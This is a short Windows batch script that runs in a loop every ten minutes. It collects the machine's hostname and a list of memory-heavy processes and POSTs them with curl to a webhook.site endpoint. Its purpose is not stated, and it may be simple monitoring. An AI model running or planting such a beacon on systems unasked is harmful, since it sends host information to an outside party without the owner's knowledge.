REM tasklist /fi "MEMUSAGE gt 209600" > c:/list.txt
:loop
hostname > c:/host.txt
set /p USER=<c:/host.txt
REM set /p APPS=<c:/list.txt
set header="User: %USER%"
for /f %%i in ('tasklist /fi "MEMUSAGE gt 209600"') do curl -X POST -H "Content-Type: text/plain" -H %header% --data %%i https://webhook.site/ac74679e-b877-41a8-846e-3b0977aa79e2
TIMEOUT /T 600
goto loop
REM set /p choice= "Please Select one of the above options :"